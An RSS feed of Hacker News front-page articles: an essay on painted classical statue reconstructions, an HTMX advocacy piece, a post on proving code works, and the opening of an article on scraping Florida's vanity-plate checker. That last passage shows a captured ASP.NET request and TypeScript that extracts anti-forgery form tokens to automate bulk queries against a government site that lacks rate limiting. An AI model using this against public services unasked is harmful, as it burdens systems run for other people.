<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-12-19T04:25:48.160855+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46311856</id><title>Classical statues were not painted horribly</title><updated>2025-12-19T04:25:58.075005+00:00</updated><content>&lt;doc fingerprint="f62213b3653a012e"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;It is often suggested that modern viewers dislike painted reconstructions of Greek and Roman statues because our taste differs from that of the ancients. This essay proposes an alternative explanation.&lt;/head&gt;
    &lt;p&gt;This is a Roman statue located in the British Museum.&lt;/p&gt;
    &lt;p&gt;It depicts the goddess Venus, perhaps originally holding a mirror. Something you will notice about it is that it looks great.&lt;/p&gt;
    &lt;p&gt;Subscribe for $100 to receive six beautiful issues per year.&lt;/p&gt;
    &lt;p&gt;Below is a Greek sculpture from half a millennium earlier.&lt;/p&gt;
    &lt;p&gt;One of the treasures recovered from the first-century BC Antikythera shipwreck, this statue is composed of bronze with inlaid stone eyes. It has been variously interpreted as representing Paris, Perseus, or a youthful Heracles. Whatever interpretation is correct, it is a stunning work of art.&lt;/p&gt;
    &lt;p&gt;Here is a detail from a wall painting in Rome. This has undergone two thousand years of wear and tear, but it is still beautiful to us.&lt;/p&gt;
    &lt;p&gt;There is a general pattern to these observations. Ancient Greek and Roman art tends to look really good today.&lt;/p&gt;
    &lt;p&gt;This is not a universal rule. The Greeks weren’t always the masters of naturalism that we know: early Archaic kouroi now seem rather stilted and uneasy. As in all societies, cruder work was produced at the lower end of the market. Art in the peripheral provinces of the Roman Empire was often clearly a clumsy imitation of work at the center. Even so, modern viewers tend to be struck by the excellence of Greek and Roman art. The examples I have given here are far from exceptions. Explore the Naples Archaeological Museum, the British Museum, the Louvre, or the Metropolitan Museum and you will see that they had tons of this stuff. Still more remarkable, in a way, is the abundance of good work discovered in Pompeii, a provincial town of perhaps 15,000 people.&lt;/p&gt;
    &lt;p&gt;Here is another Roman statue, this time depicting the Emperor Augustus. It is called the Augustus of the Prima Porta after the site where it was discovered. Something interesting about this statue is that traces of paint survive on its surface. This is because, like most though not all ancient statues, it was originally painted.&lt;/p&gt;
    &lt;p&gt;You were probably already aware of this. The coloring of ancient sculpture has become widely known in recent years as a result of several high profile projects purporting to reconstruct the original appearance of these works – most famously, Vinzenz Brinkmann’s travelling Gods in Color exhibition. This was not news to historians, who have been aware that ancient sculpture was colored (polychromatic) since the 1800s. But it took these striking reconstructions to galvanize public interest.&lt;/p&gt;
    &lt;p&gt;Here is Brinkmann’s well-known reconstruction of the Augustus of the Prima Porta.&lt;/p&gt;
    &lt;p&gt;What do you notice about this reconstruction? That’s right, it looks awful. In the eyes of modern viewers, at least, the addition of this matte, heavily saturated color has turned a really good work of art into a really bad one.&lt;/p&gt;
    &lt;p&gt;Look at this archer, from the pediment of the late archaic temple of Aphaia on Aegina.&lt;/p&gt;
    &lt;p&gt;I have not said anything novel here. Everybody knows these reconstructions look awful. The difficult and interesting question is why this is so.&lt;/p&gt;
    &lt;head rend="h3"&gt;The changing taste theory&lt;/head&gt;
    &lt;p&gt;The explanation usually given is that modern taste differs from that of the ancient Greeks and Romans. It follows that, if the reconstructions are accurate, their taste must be very alien to ours. The apparent hideousness of ancient colored sculpture strikes us partly because of what it seems to show about the profoundly changeable character of human taste.&lt;/p&gt;
    &lt;p&gt;It is usually added that we are the victims, here, of a historical accident. Paints deteriorate much more easily than marble. So, when we rediscovered classical sculpture in the Renaissance, we took the monochrome aesthetic to be intentional. As a result, we internalized a deep-seated attachment to an unblemished white image of Greek and Roman art. We became, to use David Bachelor’s term, chromophobes. It is this accidental association between Greek and Roman art and pristine white marble, we are told, that accounts for the displeasure we feel when we see the statues restored to color.&lt;/p&gt;
    &lt;p&gt;At least two things about this explanation should strike us as odd. First, there actually exist some contemporary images of statues, showing how they appeared in the ancient world. The resemblance between the statues in these pictures and the modern reconstructions is slight. The statues depicted in the ancient artworks appear to be very delicately painted, often with large portions of the surface left white. A well-known example is the depiction of a statue of Mars at the House of Venus in Pompeii.&lt;/p&gt;
    &lt;p&gt;The statues depicted on the north wall of the frigidarium in the House of the Cryptoporticus have an even gentler finish:&lt;/p&gt;
    &lt;p&gt;In other cases the colors are richer. Here too, however, the effect is far from ugly. I have given an example of this below a famous mosaic depicting a statue of a boxer, from the Villa San Marco in Stabiae. Note the subtlety of color recorded by the mosaic, in which the boxer is reddened and sunburned on his shoulders and upper chest, but not his pale upper thighs. There is nothing here to suggest that the statues depicted would have struck a modern viewer as garish.&lt;/p&gt;
    &lt;p&gt;Is there any sculpture depicted in ancient Greek and Roman visual art that resembles the modern reconstructions? To the best of my knowledge, the closest example is the red, blue and yellow visage from the Villa Poppaea at Oplontis.&lt;/p&gt;
    &lt;p&gt;In that case, the treatment really does resemble the approach favored in modern reconstructions. However, the face belongs not to a classical statue but to a theatrical mask, and is grotesque in form as well as in color. It is not strong evidence that a similar approach was taken with normal classical statuary.&lt;/p&gt;
    &lt;p&gt;Depictions of people in paintings and mosaics also use color very differently to the modern reconstructions of polychrome ancient sculpture. Here are two examples, each of which show a sensitive naturalism that is, if anything, surprisingly close to modern taste. Again, these are not one-offs: countless further examples could be given.&lt;/p&gt;
    &lt;p&gt;Classical art evolved over the centuries, and some of it looks quite different from these examples. But it is difficult or impossible to find an ancient picture from any period whose coloring resembles the Brinkmann reconstructions. Of course, we cannot be sure that the Romans colored their statues in the same way they colored their pictures. But it is surely suspicious that their use of color in pictures tends to be beautiful and intuitive to us.&lt;/p&gt;
    &lt;p&gt;Some indirect evidence is also provided by the uses of color in ancient interior design, as seen below. The intensity of red on the Farnesia walls is striking, but these cases rarely seem grotesque in the way that the sculptural reconstructions do, nor do they seem to manifest a radically foreign taste in color. In all these cases, ancient art is enjoyable despite having retained its original color.&lt;/p&gt;
    &lt;p&gt;Neither, it might be added, do we find it impossible to appreciate the painted statues of cultures beyond ancient Greece and Rome. It is true that polychrome sculpture often verges on an uncanny valley effect, but it seldom looks as bad to us as the classical reconstructions. This is true not only of the polychrome sculpture from post-classic Europe, like that of the Middle Ages, the Renaissance and the Spanish and German Baroque, but of polychrome sculpture from pre-classical and non-Western cultures, like dynastic Egypt or medieval Nepal. Many of these sculptures have an eerie quality. It is perhaps no accident that they were often used in religious rituals, as were the sculptures of antiquity. But they seldom seem distractingly ugly.&lt;/p&gt;
    &lt;p&gt;We are thus asked to believe not only that the colored sculpture of Greek and Roman antiquity was distinctive among its art forms in seeming consistently ugly to us, but also that it is distinctive among the colored sculptural traditions of the world in doing so. This seems unlikely to be true.&lt;/p&gt;
    &lt;head rend="h3"&gt;The bad painting theory&lt;/head&gt;
    &lt;p&gt;We should be doubtful, then, of the idea that modern reconstructions of colored ancient statues seem ugly to us because we do not share Graeco-Roman taste in color. Ancient depictions of statues, other ancient depictions of people, and other ancient uses of color, all suggest that their feeling for color was not so different to ours. It is also suspicious that other cultures have produced colored sculpture that we readily appreciate. Is there a better explanation of what is going on here?&lt;/p&gt;
    &lt;p&gt;There is a single explanation for the fact that the reconstructions do not resemble the statues depicted in ancient artworks, the fact that their use of color is unlike that in ancient mosaics and frescoes, and the fact that modern viewers find them ugly. It is that the reconstructions are painted very badly. There is no reason to posit that ancient Europeans had tastes radically unlike ours to explain our dislike of the reconstructions. The Greeks and Romans would have disliked them too, because the reconstructed polychromy is no good.&lt;/p&gt;
    &lt;p&gt;Two objections might be raised to my proposal. They are, however, easily answered.&lt;/p&gt;
    &lt;p&gt;First, it might be thought that my explanation cannot be right because the experts who produce the reconstructions know that this is what the statues originally looked like. After all, it might be reasoned that their work is based on a scientific analysis of the paint residues left over from the original finish.&lt;/p&gt;
    &lt;p&gt;This objection should not worry us. Nobody, to my knowledge, seriously claims that the methods used to produce the reconstructions guarantee a high degree of accuracy. And this should come as no surprise. The paints used in the reconstructions are chemically similar to the trace pigments found on parts of the surface of the originals. However, those pigments formed the underlayer of a finished work to which they bear a very conjectural relationship. Imagine a modern historian trying to reconstruct the Mona Lisa on the basis of a few residual pigments here and there on a largely featureless canvas.&lt;/p&gt;
    &lt;p&gt;How confident could we be that the result accurately reproduces the original?&lt;/p&gt;
    &lt;p&gt;This point is not actually disputed by supporters of the reconstructions. For example, Cecilie Brøns, who leads a project on ancient polychromy at the Ny Carlsberg Glyptotek in Copenhagen, praises the reconstructions but notes that ‘reconstructions can be difficult to explain to the public – that these are not exact copies, that we can never know exactly how they looked’.&lt;/p&gt;
    &lt;p&gt;Second, it might be urged that it makes no difference whether the reconstructions are accurate because there is simply no way to paint the statues, consistent with the pigments that have been left behind, that modern viewers will find beautiful.&lt;/p&gt;
    &lt;p&gt;But this just isn’t true. It is manifestly possible to paint a classical statue in a manner consistent with the evidence that will look incomparably more beautiful to the modern viewer than the typical reconstructions do. The triumphant examples above from Egypt and Nepal above prove this incontrovertibly.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why make a bad reconstruction?&lt;/head&gt;
    &lt;p&gt;Why, then, are the reconstructions so ugly? One factor may be that the specialists who execute them lack the skill of classical artists, who had many years of training in a great tradition.&lt;/p&gt;
    &lt;p&gt;Another may be that they are hampered by conservation doctrines that forbid including any feature in a reconstruction for which there is no direct archaeological evidence. Since underlayers are generally the only element of which traces survive, such doctrines lead to all-underlayer reconstructions, with the overlayers that were obviously originally present excluded for lack of evidence.&lt;/p&gt;
    &lt;p&gt;If that is the explanation, though, reconstruction specialists have been notably unsuccessful in alerting the public to the fact that colored classical sculpture bore no more resemblance to these reconstructions than the Mona Lisa would to a reconstruction that included only its underlayers. Much of the educated public believes that ancient sculpture looked something like these reconstructions, not that these reconstructions are a highly artificial exercise in reconstructing elements of ancient polychromy for which we have direct archaeological evidence.&lt;/p&gt;
    &lt;p&gt;One wonders if something else is going on here. The enormous public interest generated by garish reconstructions is surely because of and not in spite of their ugliness. It is hard to believe that this is entirely accidental. One possibility is that the reconstructors are engaged in a kind of trolling. In this interpretation, they know perfectly well that ancient sculptures did not look like the reconstructions, and probably included the subtle variation of color tones that ancient paintings did. But they fail to correct the belief that people naturally form given what is placed before them: that the proffered reconstruction of ancient sculpture is roughly what ancient sculpture actually looked like.&lt;/p&gt;
    &lt;p&gt;It is a further question whether such trolling would be deeply objectionable. Brinkmann has produced a massively successful exhibition, which has more than accomplished its aim of making the fact that ancient statues were painted more widely known. The reconstructions are often very funny and are not all as bad as the best-known examples. There is genuine intellectual value in the project and what could be seen as mean-spirited iconoclasm could equally be embraced as harmless fun.&lt;/p&gt;
    &lt;p&gt;On the other hand, at a time when trust in the honest intentions of experts is at a low, it may be unwise for experts to troll the public.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://worksinprogress.co/issue/were-classical-statues-painted-horribly/"/><published>2025-12-18T12:28:45+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46312973</id><title>Please just try HTMX</title><updated>2025-12-19T04:25:57.927559+00:00</updated><content>&lt;doc fingerprint="2d3a910c51e20a7c"&gt;
  &lt;main&gt;&lt;p&gt;A measured-yet-opinionated plea from someone who's tired of watching you suffer&lt;/p&gt;&lt;p&gt;Look. I'm not going to call you a fucking moron every other sentence. That's been done. It's a whole genre now. And honestly? HTMX doesn't need me to scream at you to make its point.&lt;/p&gt;&lt;p&gt;The sweary web manifesto thing is fun—I've enjoyed reading them—but let's be real: yelling "JUST USE HTML" or "JUST FUCKING USE REACT" hasn't actually changed anyone's stack. People nod, chuckle, and then go right back to fighting their raw JS or their webpack config.1&lt;/p&gt;&lt;p&gt;So I'm going to try something different. I'll still swear (I'm not a fucking saint), but I'm also going to show you something, in the course of imploring you, for your own sanity and happiness, to at least please just try htmx.&lt;/p&gt;&lt;p&gt;Right now, the shouters are offering you two options:&lt;/p&gt;&lt;p&gt;Option A: "Just use HTML!" And they're not wrong. HTML is shockingly capable. Forms work. Links work. The &lt;code&gt;&amp;lt;dialog&amp;gt;&lt;/code&gt; element exists now. The web was built on this stuff and it's been chugging along since Tim Berners-Lee had hair. And a little tasteful CSS can go a long motherfucking way.&lt;/p&gt;&lt;p&gt;But sometimes—and here's where it gets uncomfortable—you actually do need a button that updates part of a page without reloading the whole damn thing. You do need a search box that shows results as you type. You do need interactivity.&lt;/p&gt;&lt;p&gt;So you turn to:&lt;/p&gt;&lt;p&gt;Option B: React (or Vue, or Svelte, or Angular if you're being punished for something).&lt;/p&gt;&lt;p&gt;And suddenly you've got:&lt;/p&gt;&lt;code&gt;package.json&lt;/code&gt; with 847 dependencies&lt;code&gt;useEffect&lt;/code&gt; runs twice&lt;p&gt;For what? A to-do list? A contact form? A dashboard that displays some numbers from a database?&lt;/p&gt;&lt;p&gt;This is the false choice: raw HTML's limitations or JavaScript framework purgatory.&lt;/p&gt;&lt;p&gt;There's a third option. I'm begging you, please just try it.&lt;/p&gt;&lt;p&gt;What if I told you:&lt;/p&gt;&lt;p&gt;That's HTMX. That's literally the whole thing.&lt;/p&gt;&lt;p&gt;Here's a button that makes a POST request and replaces itself with the response:&lt;/p&gt;&lt;code&gt;&amp;lt;button hx-post="/clicked" hx-swap="outerHTML"&amp;gt;
    Click me
&amp;lt;/button&amp;gt;&lt;/code&gt;

&lt;p&gt;When you click it, HTMX POSTs to &lt;code&gt;/clicked&lt;/code&gt;, and whatever HTML the server returns replaces the button. No &lt;code&gt;fetch()&lt;/code&gt;. No &lt;code&gt;setState()&lt;/code&gt;. No &lt;code&gt;npm install&lt;/code&gt;. No fucking webpack config.&lt;/p&gt;&lt;p&gt;The server just returns HTML. Like it's 2004, except your users have fast internet and your server can actually handle it. It's the hypermedia architecture the entire freaking web was designed for, but with modern conveniences.&lt;/p&gt;&lt;p&gt;This page uses HTMX. These demos actually work.&lt;/p&gt;&lt;p&gt;This button makes a POST request and swaps in the response:&lt;/p&gt;&lt;p&gt;This button fetches additional content and appends it below:&lt;/p&gt;&lt;p&gt;Here's some initial content.&lt;/p&gt;&lt;p&gt;Type something—results update as you type (debounced, of course):&lt;/p&gt;&lt;p&gt;That's HTMX. I didn't write JavaScript to make those work. I wrote HTML attributes. The "server" (mocked client-side for this demo, but the htmx code is real) returns HTML fragments, and HTMX swaps them in. The behavior is right there in the markup—you don't have to hunt through component files and state management code to understand what a button does. HTMX folks call this "Locality of Behavior" and once you have it, you'll miss it everywhere else.&lt;/p&gt;&lt;p&gt;Anecdotes are nice. Data is better.&lt;/p&gt;&lt;p&gt;A company called Contexte rebuilt their production SaaS app from React to Django templates with HTMX. Here's what happened:&lt;/p&gt;&lt;p&gt;They deleted two-thirds of their codebase and the app got better. Every developer became "full-stack" because there wasn't a separate frontend to specialize in anymore.&lt;/p&gt;&lt;p&gt;Now, they note this was a content-focused app and not every project will see these exact numbers. Fair. But even if you got half these improvements, wouldn't that be worth a weekend of experimentation?&lt;/p&gt;&lt;p&gt;"But what about complex client-side state management?"&lt;/p&gt;&lt;p&gt;You probably don't have complex client-side state. You have forms. You have lists. You have things that show up when you click other things. HTMX handles all of that.&lt;/p&gt;&lt;p&gt;If you're building Google Docs, sure, you need complex state management. But you're not building Google Docs. You're building a CRUD app that's convinced it's Google Docs.&lt;/p&gt;&lt;p&gt;"But the React ecosystem!"&lt;/p&gt;&lt;p&gt;The ecosystem is why your &lt;code&gt;node_modules&lt;/code&gt; folder is 2GB. The ecosystem is why there are 14 ways to style a component and they all have tradeoffs. The ecosystem is why "which state management library" is somehow still a debate.&lt;/p&gt;&lt;p&gt;HTMX's ecosystem is: your server-side language of choice. That's it. That's the ecosystem.&lt;/p&gt;&lt;p&gt;"But SPAs feel faster!"&lt;/p&gt;&lt;p&gt;After the user downloads 2MB of JavaScript, waits for it to parse, waits for it to execute, waits for it to hydrate, waits for it to fetch data, waits for it to render... yes, then subsequent navigations feel snappy. Congratulations.&lt;/p&gt;&lt;p&gt;HTMX pages load fast the first time because you're not bootstrapping an application runtime. And subsequent requests are fast because you're only swapping the parts that changed.&lt;/p&gt;&lt;p&gt;"But I need [specific React feature]!"&lt;/p&gt;&lt;p&gt;Maybe you do. I'm not saying React is never the answer. I'm saying it's the answer to about 10% of the problems it's used for, and the costs of reaching for it reflexively are staggering.&lt;/p&gt;&lt;p&gt;Most teams don't fail because they picked the wrong framework. They fail because they picked too much framework. HTMX is a bet on simplicity, and simplicity tends to win over time.&lt;/p&gt;&lt;p&gt;I'm not a zealot. HTMX isn't for everything.&lt;/p&gt;&lt;p&gt;But be honest with yourself: is that what you're building?&lt;/p&gt;&lt;p&gt;Or are you building another dashboard, another admin panel, another e-commerce site, another blog, another SaaS app that's fundamentally just forms and tables and lists? Be honest. I won't tell anyone. We all have to pay the bills.&lt;/p&gt;&lt;p&gt;For that stuff, HTMX is embarrassingly good. Like, "why did we make it so complicated" good. Like, "oh god, we wasted so much time" good.&lt;/p&gt;&lt;p&gt;You've tried React. You've tried Vue. You've tried Angular and regretted it. You've tried whatever meta-framework is trending on Hacker News this week.&lt;/p&gt;&lt;p&gt;Just try HTMX. One weekend. Pick a side project. Pick that internal tool nobody cares about. Pick the thing you've been meaning to rebuild anyway.&lt;/p&gt;&lt;p&gt;Add one &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag. Write one &lt;code&gt;hx-get&lt;/code&gt; attribute. Watch what happens.&lt;/p&gt;&lt;p&gt;If you hate it, you've lost a weekend. But you won't hate it. You'll wonder why you ever thought web development had to be so fucking complicated.&lt;/p&gt;&lt;p&gt; Learn more:&lt;lb/&gt; htmx.org — The official site and docs&lt;lb/&gt; hypermedia.systems — The free book on hypermedia-driven apps &lt;/p&gt;&lt;p&gt;1 Honor obliges me to admit this is not literally true. bettermotherfuckingwebsite.com is a fucking pedagogical masterpiece and reshaped how I built my own site. But let's not spoil the bit... ↩&lt;/p&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="http://pleasejusttryhtmx.com/"/><published>2025-12-18T14:18:52+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313297</id><title>Your job is to deliver code you have proven to work</title><updated>2025-12-19T04:25:57.768630+00:00</updated><content>&lt;doc fingerprint="a640485769051507"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Your job is to deliver code you have proven to work&lt;/head&gt;
    &lt;p&gt;18th December 2025&lt;/p&gt;
    &lt;p&gt;In all of the debates about the value of AI-assistance in software development there’s one depressing anecdote that I keep on seeing: the junior engineer, empowered by some class of LLM tool, who deposits giant, untested PRs on their coworkers—or open source maintainers—and expects the “code review” process to handle the rest.&lt;/p&gt;
    &lt;p&gt;This is rude, a waste of other people’s time, and is honestly a dereliction of duty as a software developer.&lt;/p&gt;
    &lt;p&gt;Your job is to deliver code you have proven to work.&lt;/p&gt;
    &lt;p&gt;As software engineers we don’t just crank out code—in fact these days you could argue that’s what the LLMs are for. We need to deliver code that works—and we need to include proof that it works as well. Not doing that directly shifts the burden of the actual work to whoever is expected to review our code.&lt;/p&gt;
    &lt;head rend="h4"&gt;How to prove it works&lt;/head&gt;
    &lt;p&gt;There are two steps to proving a piece of code works. Neither is optional.&lt;/p&gt;
    &lt;p&gt;The first is manual testing. If you haven’t seen the code do the right thing yourself, that code doesn’t work. If it does turn out to work, that’s honestly just pure chance.&lt;/p&gt;
    &lt;p&gt;Manual testing skills are genuine skills that you need to develop. You need to be able to get the system into an initial state that demonstrates your change, then exercise the change, then check and demonstrate that it has the desired effect.&lt;/p&gt;
    &lt;p&gt;If possible I like to reduce these steps to a sequence of terminal commands which I can paste, along with their output, into a comment in the code review. Here’s a recent example.&lt;/p&gt;
    &lt;p&gt;Some changes are harder to demonstrate. It’s still your job to demonstrate them! Record a screen capture video and add that to the PR. Show your reviewers that the change you made actually works.&lt;/p&gt;
    &lt;p&gt;Once you’ve tested the happy path where everything works you can start trying the edge cases. Manual testing is a skill, and finding the things that break is the next level of that skill that helps define a senior engineer.&lt;/p&gt;
    &lt;p&gt;The second step in proving a change works is automated testing. This is so much easier now that we have LLM tooling, which means there’s no excuse at all for skipping this step.&lt;/p&gt;
    &lt;p&gt;Your contribution should bundle the change with an automated test that proves the change works. That test should fail if you revert the implementation.&lt;/p&gt;
    &lt;p&gt;The process for writing a test mirrors that of manual testing: get the system into an initial known state, exercise the change, assert that it worked correctly. Integrating a test harness to productively facilitate this is another key skill worth investing in.&lt;/p&gt;
    &lt;p&gt;Don’t be tempted to skip the manual test because you think the automated test has you covered already! Almost every time I’ve done this myself I’ve quickly regretted it.&lt;/p&gt;
    &lt;head rend="h4"&gt;Make your coding agent prove it first&lt;/head&gt;
    &lt;p&gt;The most important trend in LLMs in 2025 has been the explosive growth of coding agents—tools like Claude Code and Codex CLI that can actively execute the code they are working on to check that it works and further iterate on any problems.&lt;/p&gt;
    &lt;p&gt;To master these tools you need to learn how to get them to prove their changes work as well.&lt;/p&gt;
    &lt;p&gt;This looks exactly the same as the process I described above: they need to be able to manually test their changes as they work, and they need to be able to build automated tests that guarantee the change will continue to work in the future.&lt;/p&gt;
    &lt;p&gt;Since they’re robots, automated tests and manual tests are effectively the same thing.&lt;/p&gt;
    &lt;p&gt;They do feel a little different though. When I’m working on CLI tools I’ll usually teach Claude Code how to run them itself so it can do one-off tests, even though the eventual automated tests will use a system like Click’s CLIRunner.&lt;/p&gt;
    &lt;p&gt;When working on CSS changes I’ll often encourage my coding agent to take screenshots when it needs to check if the change it made had the desired effect.&lt;/p&gt;
    &lt;p&gt;The good news about automated tests is that coding agents need very little encouragement to write them. If your project has tests already most agents will extend that test suite without you even telling them to do so. They’ll also reuse patterns from existing tests, so keeping your test code well organized and populated with patterns you like is a great way to help your agent build testing code to your taste.&lt;/p&gt;
    &lt;p&gt;Developing good taste in testing code is another of those skills that differentiates a senior engineer.&lt;/p&gt;
    &lt;head rend="h4"&gt;The human provides the accountability&lt;/head&gt;
    &lt;p&gt;A computer can never be held accountable. That’s your job as the human in the loop.&lt;/p&gt;
    &lt;p&gt;Almost anyone can prompt an LLM to generate a thousand-line patch and submit it for code review. That’s no longer valuable. What’s valuable is contributing code that is proven to work.&lt;/p&gt;
    &lt;p&gt;Next time you submit a PR, make sure you’ve included your evidence that it works as it should.&lt;/p&gt;
    &lt;head rend="h2"&gt;More recent articles&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Gemini 3 Flash - 17th December 2025&lt;/item&gt;
      &lt;item&gt;I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours - 15th December 2025&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://simonwillison.net/2025/Dec/18/code-proven-to-work/"/><published>2025-12-18T14:52:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46313379</id><title>Using TypeScript to obtain one of the rarest license plates</title><updated>2025-12-19T04:25:57.461167+00:00</updated><content>&lt;doc fingerprint="90503446b29f284"&gt;
  &lt;main&gt;
    &lt;p&gt;Most people never think twice about the random mix of letters and numbers the DMV assigns them.&lt;/p&gt;
    &lt;p&gt;I'm not one of those people.&lt;/p&gt;
    &lt;p&gt;Online, I've always chased having a clean and memorable digital identity. Over the years, I've been able to pick up handles like my first + last name on Instagram (@jlaf) and full words across platforms (@explain, @discontinue). So when the DMV mailed me my third reminder to renew my registration, that same instinct kicked in: why hadn't I considered getting a distinctive plate combination of my own?&lt;/p&gt;
    &lt;p&gt;In the world of license plates exists a rarity hierarchy:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Single number license plates (10 possible)&lt;/item&gt;
      &lt;item&gt;Repeating number license plates (10 possible)&lt;/item&gt;
      &lt;item&gt;Single letter license plates (26 possible)&lt;/item&gt;
      &lt;item&gt;Repeating letter combinations (??? possible)&lt;/item&gt;
      &lt;item&gt;Two letter plate combinations (676 possible)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;After some research about the history these rare plates, my curiosity got the best of me. How rare could you really go? And how far can you push a state's public lookup tools to find out?&lt;/p&gt;
    &lt;head rend="h2"&gt;PlateRadar &amp;amp; the Monopoly&lt;/head&gt;
    &lt;p&gt;As it stands right now, there's a single resource to find mass information on license plate availability: PlateRadar. PlateRadar, like any smart website, recognizes that this data is definitely worth something to someone - and as a result, hides any information that might be deemed rare behind a 20 dollar a month paywall. The site also refreshes every 24 hours, and from my history with rare usernames I know that time is of the absolute essence when snagging something rare. 24 hours wasn't going to cut it.&lt;/p&gt;
    &lt;p&gt;Unfortunately for PlateRadar, I'm an engineer and not a normal human being, so I decided to dig in on how vanity plates are deemed available or unavailable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Florida's Vanity Plate Checker&lt;/head&gt;
    &lt;p&gt;Florida, unlike some states (!), provides a website that allows you to check a license plate configuration (meaning the custom sequence of letters/numbers that you want printed on your plate) before you waste your time sitting in line at the tax collector's office. The tool also provides the plate types that support that combination, as different plates also allow different character limits (for example, some only permit 5 characters while allow others up to 7 characters).&lt;/p&gt;
    &lt;p&gt;Thankfully, the site had the nifty feature to check more than a single combination at a time, with no additional delay in the request. I was submitting some combinations manually before realizing that I was able to make requests pretty fast manually - so what if I just automated this whole process?&lt;/p&gt;
    &lt;head rend="h3"&gt;The Rate is Limitless&lt;/head&gt;
    &lt;p&gt;I fired up Burp Suite and proxied a request to the service. What came through looked like this:&lt;/p&gt;
    &lt;quote&gt;POST https://services.flhsmv.gov/mvcheckpersonalplate/ HTTP/1.1__VIEWSTATE=/wEPDwULLTE2Nzg2NjE0NDgPZBYCZg9kFgICAw9kFgICAQ9kFgwCBQ8PFgIeBFRleHQFCUFWQUlMQUJMRWRkAgcPDxYCHgdWaXNpYmxlZ2RkAgsPDxYCHwAFASBkZAIRDw8WAh8ABQEgZGQCFw8PFgIfAAUBIGRkAh0PDxYCHwAFASBkZGQZj5Nowpt7uQW4i5K8gYM8k2+WSv9Zz0wpvFKj57zF0w==__VIEWSTATEGENERATOR=0719FE0A__EVENTVALIDATION=/wEdAAlM0TkirL0XIlY9Dw0k/5tSphigSR1TLsx/PgGne7pkToFkrQPgalhmo+FySJy6U4iQeyzYgJga2PpZFeMkYbpKuFA0Lbs4tsi+aCEe29qpNhTkiCU5GKYk9WuPyhuiSM5sZFBTNc+Q1lCok0SfYOt8+CHI2KGhrgOke/DbhB4LDccabLrTZbd0ckqhWOrhQ2MjwxuXnk/njUGbYQbYHdP4Ds+OFyUVKVe45DGbH/0quQ==ctl00$MainContent$txtInputRowOne=MYPLATEctl00$MainContent$txtInputRowTwoctl00$MainContent$txtInputRowThreectl00$MainContent$txtInputRowFourctl00$MainContent$txtInputRowFivectl00$MainContent$btnSubmit=Submit&lt;/quote&gt;
    &lt;p&gt;&lt;code&gt;__VIEWSTATE&lt;/code&gt;, &lt;code&gt;__VIEWSTATEGENERATOR&lt;/code&gt;, and &lt;code&gt;__EVENTVALIDATION&lt;/code&gt; immediately tipped me off that this was an ASP.NET Web Form. Granted, this is a government website, so honestly, what else was I expecting?&lt;/p&gt;
    &lt;p&gt;EVENTVALIDATION is (was?) a novel security measure implemented in 2006 by the ASP.NET team to "prevents unauthorized requests sent by potentially malicious users from the client [..] to ensure that each and every postback and callback event originates from the expected user interface elements, the page adds an extra layer of validation on events".&lt;/p&gt;
    &lt;p&gt;In practice, it's meant to stop forged form submissions, which theoretically sounds like a scraping killer. If I had to fetch a fresh set of these variables before making any form of a request, I'd quickly overwhelm the system with round-trips and get rate-limited almost immediately.&lt;/p&gt;
    &lt;p&gt;... except there was no ratelimiting. At all.&lt;/p&gt;
    &lt;p&gt;See, the website had absolutely zero CAPTCHA, IP ratelimiting, or web application firewall stopping an influx of requests from coming in. I quickly verified this by using Burp Repeater to make a number of null payload requests, which all returned a status code of 200 Successful.&lt;/p&gt;
    &lt;p&gt;Once I realized this, I quickly threw a script together to automate the entire process. The workflow looks something like this:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Fetch the page once using real browser headers, which loads the ASP.NET form and gives me &lt;code&gt;__VIEWSTATE&lt;/code&gt;,&lt;code&gt;__VIEWSTATEGENERATOR&lt;/code&gt;and&lt;code&gt;__EVENTVALIDATION&lt;/code&gt;- and the power to make a legitimate POST request.&lt;/item&gt;
      &lt;item&gt;Extract the values from the form using a Regex helper.&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;function extractFormFields(html: string): {viewState: string;viewStateGenerator: string;eventValidation: string;} {const viewStateMatch = html.match(/id="__VIEWSTATE"\s+value="([^"]+)"/);const viewStateGeneratorMatch = html.match(/id="__VIEWSTATEGENERATOR"\s+value="([^"]+)"/);const eventValidationMatch = html.match(/id="__EVENTVALIDATION"\s+value="([^"]+)"/);if (!viewStateMatch || !viewStateGeneratorMatch || !eventValidationMatch) {throw new Error("Failed to extract required form fields from page");}return {viewState: viewStateMatch[1],viewStateGenerator: viewStateGeneratorMatch[1],eventValidation: eventValidationMatch[1],};}&lt;/quote&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Build the POST request with all necessary fields. The actual plate combinations were submitted through &lt;code&gt;ctl00$MainContent$txtInputRowXXX&lt;/code&gt;, where XXX was&lt;code&gt;one&lt;/code&gt;through&lt;code&gt;five&lt;/code&gt;. Using this let me check plate availability 5x faster - and when checking thousands of license plate combinations at a time, it definitely matters.&lt;/item&gt;
    &lt;/list&gt;
